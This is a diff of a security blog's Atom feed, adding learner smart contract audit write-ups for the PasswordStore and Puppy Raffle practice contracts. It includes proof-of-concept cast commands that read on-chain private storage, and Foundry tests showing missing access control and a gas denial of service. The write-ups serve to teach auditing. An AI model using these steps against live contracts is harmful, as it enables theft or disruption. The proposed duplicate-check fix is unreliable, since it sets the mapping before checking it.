+&lt;li&gt;Call unlock(bytes16(key))&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;cast&lt;&#x2F;span&gt;&lt;span&gt; send $CONTRACT_ADDR &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;unlock(bytes16)&amp;quot; &lt;&#x2F;span&gt;&lt;span&gt;$BYTES16_KEY&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --private-key &lt;&#x2F;span&gt;&lt;span&gt;$PK&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Solidity Projects</title>
+        <published>2024-04-25T00:00:00+00:00</published>
+        <updated>2024-04-25T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Unknown
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://4l0n3r.github.io/projects/rust/"/>
+        <id>https://4l0n3r.github.io/projects/rust/</id>
+        
+        <content type="html" xml:base="https://4l0n3r.github.io/projects/rust/">&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;crab-rust-projects-learnings&quot;&gt;🦀 Rust Projects &amp;amp; Learnings&lt;&#x2F;h2&gt;
+&lt;p&gt;My exploration of Rust, including system-level programming, cryptographic structures, and CLI tool development.&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;h3 id=&quot;link-merkle-tree-using-rust&quot;&gt;🔗 &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;4l0n3r&#x2F;merkle-tree-using-rust&quot;&gt;merkle-tree-using-rust&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;A Merkle Tree implementation in Rust with SHA-256 hashing. Useful for understanding data integrity in blockchain and cryptographic systems.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;link-rustic-journal&quot;&gt;🔗 &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;4l0n3r&#x2F;rustic-journal&quot;&gt;rustic-journal&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;A command-line journaling tool built in Rust. It lets you write, view, and manage daily logs via terminal.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;link-rustlings-journal&quot;&gt;🔗 &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;4l0n3r&#x2F;rustlings-journal&quot;&gt;rustlings-journal&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;A personal log of solutions and reflections from the popular &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;rust-lang&#x2F;rustlings&quot;&gt;Rustlings&lt;&#x2F;a&gt; learning course.&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;p&gt;Rust’s safety and performance make it ideal for systems programming and blockchain tooling — expect more Rust content here soon!&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>First Flight 1 : PasswordStore</title>
+        <published>2023-10-25T00:00:00+00:00</published>
+        <updated>2023-10-25T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Unknown
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://4l0n3r.github.io/writeups/first-flight-1-paawordstore/"/>
+        <id>https://4l0n3r.github.io/writeups/first-flight-1-paawordstore/</id>
+        
+        <content type="html" xml:base="https://4l0n3r.github.io/writeups/first-flight-1-paawordstore/">&lt;h1 id=&quot;high&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#high&quot; aria-label=&quot;Anchor link for: high&quot;&gt;High&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;h2 id=&quot;h1-storing-password-on-chain-makes-it-visible-to-anyone&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#h1-storing-password-on-chain-makes-it-visible-to-anyone&quot; aria-label=&quot;Anchor link for: h1-storing-password-on-chain-makes-it-visible-to-anyone&quot;&gt;[H1] Storing password on-chain makes it visible to anyone&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;strong&gt;Description:&lt;&#x2F;strong&gt;
+The data that we stored at &lt;code&gt;PasswordStore:s_password&lt;&#x2F;code&gt; is intended to be private and only visible to the owner. since it was placed on chain, everything that we store on-chain is visible to everyone.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Impact:&lt;&#x2F;strong&gt;
+Anyone can read the private data, breaking the protocol rule.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Proof of Concept:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;Start the local chain&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$ make anvil
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ol start=&quot;2&quot;&gt;
+&lt;li&gt;Deploy the contract&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$ make deploy
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ol start=&quot;3&quot;&gt;
+&lt;li&gt;Get the storage slot data in which our password got stored&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$ cast storage &amp;lt;contract_address&amp;gt; 1
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ol start=&quot;4&quot;&gt;
+&lt;li&gt;Parse hex to string&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$ cast parse-bytes32-string &amp;lt;Output form the above command&amp;gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;Recommended Mitigation:&lt;&#x2F;strong&gt;
+It would be a best practice to not store any private data on-chain since the chain is public to everyone. We should rethink about the architecture because we are going to eliminate the password from the chain. One think we could do is to, encrypt the password off-chain before we store it on-chain. this will lead us to store one key off-chain to decode the encrypted password.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;br&gt;&lt;br&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;h2-passwordstore-setpassword-has-no-access-control-vulnerable-to-non-owner-to-change-it&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#h2-passwordstore-setpassword-has-no-access-control-vulnerable-to-non-owner-to-change-it&quot; aria-label=&quot;Anchor link for: h2-passwordstore-setpassword-has-no-access-control-vulnerable-to-non-owner-to-change-it&quot;&gt;[H2] &lt;code&gt;PasswordStore::setPassword&lt;&#x2F;code&gt; has no access control, vulnerable to non-owner to change it.&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;strong&gt;Description:&lt;&#x2F;strong&gt;
+The &lt;code&gt;PasswordStore::setPassword&lt;&#x2F;code&gt; function is intended to trigger only by the owner to change the &lt;code&gt;PasswordStore::s_password&lt;&#x2F;code&gt;. Since the function doesn&#x27;t have any access control, it allows even a non-owner to change the password.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Impact:&lt;&#x2F;strong&gt;
+Anyone can change the stored password, breaking the contract functional rule.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Proof Of Concept:&lt;&#x2F;strong&gt;
+Let&#x27;s write a fuzz test to see whether non-owner is able to change the password or not.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bibtex&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bibtex &quot;&gt;&lt;code class=&quot;language-bibtex&quot; data-lang=&quot;bibtex&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;    function testAnyoneCanSetPassword(address nonOwner) external {
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;        string memory newPassword = &amp;quot;newPassword&amp;quot;;
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;        vm.assume(nonOwner != owner );
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;        vm.prank(nonOwner);
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;        passwordStore.setPassword(newPassword);
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;        vm.prank(owner);
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;        string memory updatePassword = passwordStore.getPassword();
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;        assertEq(newPassword,updatePassword);
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;    }
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;passing this test tells us that a non-user can update the password.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Mitigation:&lt;&#x2F;strong&gt;
+Add the below lines to make sure only owner can trigger the function.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bibtex&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bibtex &quot;&gt;&lt;code class=&quot;language-bibtex&quot; data-lang=&quot;bibtex&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;    if (msg.sender != s_owner) {
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;        revert PasswordStore__NotOwner();
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;    }
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;br&gt;&lt;br&gt;&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;h1 id=&quot;low&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#low&quot; aria-label=&quot;Anchor link for: low&quot;&gt;Low&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;h2 id=&quot;l1-initialization-timeframe-vulnerability&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#l1-initialization-timeframe-vulnerability&quot; aria-label=&quot;Anchor link for: l1-initialization-timeframe-vulnerability&quot;&gt;[L1] Initialization Timeframe Vulnerability&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;strong&gt;Description:&lt;&#x2F;strong&gt;
+The PasswordStore contract exhibits an initialization timeframe vulnerability. This means that there is a period between contract deployment and the explicit call to setPassword during which the password remains in its default state. During this initialization timeframe, the contract&#x27;s password is effectively empty and can be considered a security gap.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Impact:&lt;&#x2F;strong&gt;
+The impact of this vulnerability is that during the initialization timeframe, the contract&#x27;s password is left empty, potentially exposing the contract to unauthorized access or unintended behavior.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Mitigation:&lt;&#x2F;strong&gt;
+To mitigate the initialization timeframe vulnerability, consider setting a password value during the contract&#x27;s deployment&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;h1 id=&quot;informative&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#informative&quot; aria-label=&quot;Anchor link for: informative&quot;&gt;Informative&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;h2 id=&quot;i1-netspec-indicates-a-parameter-that-doesn-t-exist-causing-netspec-incorrect&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#i1-netspec-indicates-a-parameter-that-doesn-t-exist-causing-netspec-incorrect&quot; aria-label=&quot;Anchor link for: i1-netspec-indicates-a-parameter-that-doesn-t-exist-causing-netspec-incorrect&quot;&gt;[I1] Netspec indicates a parameter that doesn&#x27;t exist, causing netspec incorrect.&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;strong&gt;Description:&lt;&#x2F;strong&gt;
+The &lt;code&gt;PasswordStore::getPassword&lt;&#x2F;code&gt; function is not expecting any parameter where in the netSpec says it should be getPassword(string)&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Impact:&lt;&#x2F;strong&gt;
+False documentation making confusion for consumers&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Mitigation:&lt;&#x2F;strong&gt;
+Remove the unnecessary netSpec line.&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>First Flight 2 : Puppy Raffle</title>
+        <published>2023-10-25T00:00:00+00:00</published>
+        <updated>2023-10-25T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Unknown
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://4l0n3r.github.io/writeups/first-flight-2-puppy-raffle/"/>
+        <id>https://4l0n3r.github.io/writeups/first-flight-2-puppy-raffle/</id>
+        
+        <content type="html" xml:base="https://4l0n3r.github.io/writeups/first-flight-2-puppy-raffle/">&lt;h1 id=&quot;high&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#high&quot; aria-label=&quot;Anchor link for: high&quot;&gt;High&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;h2 id=&quot;h-1-weak-randomness-in-raffle-selectwinner-leads-to-anyone-to-select-the-winner&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#h-1-weak-randomness-in-raffle-selectwinner-leads-to-anyone-to-select-the-winner&quot; aria-label=&quot;Anchor link for: h-1-weak-randomness-in-raffle-selectwinner-leads-to-anyone-to-select-the-winner&quot;&gt;[H-1] Weak Randomness in &lt;code&gt;Raffle::selectWinner&lt;&#x2F;code&gt; leads to anyone to select the winner&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;strong&gt;Description:&lt;&#x2F;strong&gt;
+In &lt;code&gt;Raffle::selectWinner&lt;&#x2F;code&gt; we create a random number to select the winner.But unfortunately we are taking the &lt;code&gt;msg.sender&lt;&#x2F;code&gt;, &lt;code&gt;block.difficulty&lt;&#x2F;code&gt;, &lt;code&gt;block.timestamp&lt;&#x2F;code&gt; as a base to generate random number. Hash generated by these values is predictable. Anyone can figure out the values before tha hand and that make himself&#x2F;herself as a winner.
+&lt;strong&gt;Impact:&lt;&#x2F;strong&gt;
+Any user can loot the money by selecting themselves as a winner by predicting the random number.
+&lt;strong&gt;Proof of Concept:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;Validators will be aware of &lt;code&gt;block.difficulty&lt;&#x2F;code&gt; &amp;amp; &lt;code&gt;block.timestamp&lt;&#x2F;code&gt;, using this they can choose when to start the raffle.&lt;&#x2F;li&gt;
+&lt;li&gt;They can use a different &lt;code&gt;msg.sender&lt;&#x2F;code&gt; which can be used to predict the random hash along with above values.
+&lt;strong&gt;Recommended Mitigations:&lt;&#x2F;strong&gt;
+Using on-chain values as a base to the randomness is a well known threat. Better to generate a random hash off-chain and use it on-chain.&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;&lt;strong&gt;Another Instance:&lt;&#x2F;strong&gt;
+PuppyRaffle.commonImageUri (src&#x2F;PuppyRaffle.sol#139)&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;h-2-malicious-winner-can-revert-the-transaction-by-having-revert-statement-in-receive-fallback-functions-while-receiving-the-winning-amount-which-halts-the-raffle-forever&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#h-2-malicious-winner-can-revert-the-transaction-by-having-revert-statement-in-receive-fallback-functions-while-receiving-the-winning-amount-which-halts-the-raffle-forever&quot; aria-label=&quot;Anchor link for: h-2-malicious-winner-can-revert-the-transaction-by-having-revert-statement-in-receive-fallback-functions-while-receiving-the-winning-amount-which-halts-the-raffle-forever&quot;&gt;[H-2] Malicious winner can revert the transaction by having revert statement in receive&#x2F;fallback functions while receiving the winning amount which halts the raffle forever.&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;strong&gt;Description:&lt;&#x2F;strong&gt;
+In &lt;code&gt;Raffle:selectWinner&lt;&#x2F;code&gt; we are making an external call to send winning amount to the winner. If the winner is a contract and don&#x27;t have any fallbacks functions &#x2F; have revert statements in fallback functions then the transaction will be reverted this eventually makes the people to join the raffle but not get money back to anyone.
+&lt;strong&gt;Impact:&lt;&#x2F;strong&gt;
+Since the transaction failure, it&#x27;s not possible to distribute the prize as well as start a new round.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;h-3-integer-overflow-of-totalfee-fee-in-raffle-selectwinner-will-block-some-money-in-the-contract&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#h-3-integer-overflow-of-totalfee-fee-in-raffle-selectwinner-will-block-some-money-in-the-contract&quot; aria-label=&quot;Anchor link for: h-3-integer-overflow-of-totalfee-fee-in-raffle-selectwinner-will-block-some-money-in-the-contract&quot;&gt;[H-3] Integer overflow of &lt;code&gt;totalFee&lt;&#x2F;code&gt; &#x2F; &lt;code&gt;fee&lt;&#x2F;code&gt; in &lt;code&gt;Raffle:selectWinner&lt;&#x2F;code&gt; will block some money in the contract&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;strong&gt;Description:&lt;&#x2F;strong&gt;
+In solidity versions prior to &lt;code&gt;0.8.0&lt;&#x2F;code&gt; are prone to integer overflows.
+&lt;strong&gt;Impact:&lt;&#x2F;strong&gt;
+In &lt;code&gt;Raffle:selectWinner&lt;&#x2F;code&gt; we calculate the total fee generated in a raffle using two variables &lt;code&gt;totalFee&lt;&#x2F;code&gt; &amp;amp; &lt;code&gt;fee&lt;&#x2F;code&gt; which are of type &lt;code&gt;uint64&lt;&#x2F;code&gt;. &lt;code&gt;uint64&lt;&#x2F;code&gt; can handle only till &lt;code&gt;18446744073709551615&lt;&#x2F;code&gt;. There is a chance that this number can increase, in that scenario the &lt;code&gt;totalFee&lt;&#x2F;code&gt; will be having a wrong value in it.&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;h1 id=&quot;medium&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#medium&quot; aria-label=&quot;Anchor link for: medium&quot;&gt;Medium&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;h2 id=&quot;m-1-looping-through-players-array-to-check-for-duplicates-in-puppyraffle-enterraffle-is-a-potential-denial-of-service-dos-attack-incrementing-gas-costs-for-future-entrants&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#m-1-looping-through-players-array-to-check-for-duplicates-in-puppyraffle-enterraffle-is-a-potential-denial-of-service-dos-attack-incrementing-gas-costs-for-future-entrants&quot; aria-label=&quot;Anchor link for: m-1-looping-through-players-array-to-check-for-duplicates-in-puppyraffle-enterraffle-is-a-potential-denial-of-service-dos-attack-incrementing-gas-costs-for-future-entrants&quot;&gt;[M-1] Looping through players array to check for duplicates in &lt;code&gt;PuppyRaffle::enterRaffle&lt;&#x2F;code&gt;  is a potential denial of service (DoS) attack, incrementing gas costs for future entrants&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;strong&gt;Description:&lt;&#x2F;strong&gt;
+The &lt;code&gt;PuppyRaffle::enterRaffle&lt;&#x2F;code&gt;  function loops through the &lt;code&gt;players&lt;&#x2F;code&gt;  array to check for duplicates. However, the longer the &lt;code&gt;PuppyRaffle:players&lt;&#x2F;code&gt;  array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the &lt;code&gt;players&lt;&#x2F;code&gt;  array is an additional check the loop will have to make.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; Check for duplicates
+&lt;&#x2F;span&gt;&lt;span&gt;for (uint256 i = 0; i &amp;lt; players.length - 1; i++) {
+&lt;&#x2F;span&gt;&lt;span&gt;    for (uint256 j = i + 1; j &amp;lt; players.length; j++) {
+&lt;&#x2F;span&gt;&lt;span&gt;        require(players[i] != players[j], &amp;quot;PuppyRaffle: Duplicate player&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;Impact:&lt;&#x2F;strong&gt;
+The gas consts for raffle entrants will greatly increase as more players enter the raffle, discouraging later users from entering and causing a rush at the start of a raffle to be one of the first entrants in queue. An attacker might make the &lt;code&gt;PuppyRaffle:entrants&lt;&#x2F;code&gt; array so big that no one else enters, guaranteeing themselves the win.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Proof of Concept:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;If we have 2 sets of 100 players enter, the gas costs will be as such:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;1st 100 players:&lt;&#x2F;strong&gt; ~6252048 gas&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;2nd 100 players:&lt;&#x2F;strong&gt; ~18068138 gas&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;This is more than 3x more expensive for the second 100 players.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;function testDenialOfService() public {
+&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; Foundry lets us set a gas price
+&lt;&#x2F;span&gt;&lt;span&gt;    vm.txGasPrice(1);
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; Creates 100 addresses
+&lt;&#x2F;span&gt;&lt;span&gt;    uint256 playersNum = 100;
+&lt;&#x2F;span&gt;&lt;span&gt;    address[] memory players = new address[](playersNum);
+&lt;&#x2F;span&gt;&lt;span&gt;    for (uint256 i = 0; i &amp;lt; players.length; i++) {
+&lt;&#x2F;span&gt;&lt;span&gt;        players[i] = address(i);
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; Gas calculations for first 100 players
+&lt;&#x2F;span&gt;&lt;span&gt;    uint256 gasStart = gasleft();
+&lt;&#x2F;span&gt;&lt;span&gt;    puppyRaffle.enterRaffleValue{entranceFee * players.length}(players);
+&lt;&#x2F;span&gt;&lt;span&gt;    uint256 gasEnd = gasleft();
+&lt;&#x2F;span&gt;&lt;span&gt;    uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
+&lt;&#x2F;span&gt;&lt;span&gt;    console.log(&amp;quot;Gas cost of the first 100 players: &amp;quot;, gasUsedFirst);
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; Creates another array of 100 players
+&lt;&#x2F;span&gt;&lt;span&gt;    address[] memory playersTwo = new address[](playersNum);
+&lt;&#x2F;span&gt;&lt;span&gt;    for (uint256 i = 0; i &amp;lt; playersTwo.length; i++) {
+&lt;&#x2F;span&gt;&lt;span&gt;        playersTwo[i] = address(i + playersNum);
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; Gas calculations for second 100 players
+&lt;&#x2F;span&gt;&lt;span&gt;    uint256 gasStartTwo = gasleft();
+&lt;&#x2F;span&gt;&lt;span&gt;    puppyRaffle.enterRaffleValue{entranceFee * players.length}(playersTwo);
+&lt;&#x2F;span&gt;&lt;span&gt;    uint256 gasEndTwo = gasleft();
+&lt;&#x2F;span&gt;&lt;span&gt;    uint256 gasUsedSecond = (gasStartTwo - gasEndTwo) * tx.gasprice;
+&lt;&#x2F;span&gt;&lt;span&gt;    console.log(&amp;quot;Gas cost of the second 100 players: &amp;quot;, gasUsedSecond);
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    assert(gasUsedSecond &amp;gt; gasUsedFirst);
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;Recommended Mitigations:&lt;&#x2F;strong&gt;
+There are a few recommended mitigations.&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Consider allowing duplicates.&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;
+Users can make new wallet addresses anyways, so a duplicate check doesn’t prevent the same person from entering multiple times, only the same wallet address.&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Consider using a mapping to check duplicates.&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;
+This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a &lt;code&gt;uint256&lt;&#x2F;code&gt; id, and the mapping would be a player address mapped to the raffle id.&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;+ mapping(address =&amp;gt; uint256) public addressToRaffleId;
+&lt;&#x2F;span&gt;&lt;span&gt;+ uint256 public raffleId = 0;
+&lt;&#x2F;span&gt;&lt;span&gt;.
+&lt;&#x2F;span&gt;&lt;span&gt;.
+&lt;&#x2F;span&gt;&lt;span&gt;.
+&lt;&#x2F;span&gt;&lt;span&gt;function enterRaffle(address[] memory newPlayers) public payable {
+&lt;&#x2F;span&gt;&lt;span&gt;require(msg.value == entranceFee * newPlayers.length, &amp;quot;PuppyRaffle: Must send enough to enter raffle&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;for (uint256 i = 0; i &amp;lt; newPlayers.length; i++) {
+&lt;&#x2F;span&gt;&lt;span&gt;players.push(newPlayers[i]);
+&lt;&#x2F;span&gt;&lt;span&gt;+       addressToRaffleId[newPlayers[i]] = raffleId;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;-   &#x2F;&#x2F; Check for duplicates
+&lt;&#x2F;span&gt;&lt;span&gt;+   &#x2F;&#x2F; Check for duplicates only from the new players
+&lt;&#x2F;span&gt;&lt;span&gt;+   for (uint256 i = 0; i &amp;lt; newPlayers.length; i++) {
+&lt;&#x2F;span&gt;&lt;span&gt;+       require(addressToRaffleId[newPlayers[i]] != raffleId, &amp;quot;PuppyRaffle: Duplicate player&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;+   }
+&lt;&#x2F;span&gt;&lt;span&gt;-   for (uint256 i = 0; i &amp;lt; players.length; i++) {
+&lt;&#x2F;span&gt;&lt;span&gt;-       for (uint256 j = i + 1; j &amp;lt; players.length; j++) {
+&lt;&#x2F;span&gt;&lt;span&gt;-           require(players[i] != players[j], &amp;quot;PuppyRaffle: Duplicate player&amp;quot;);
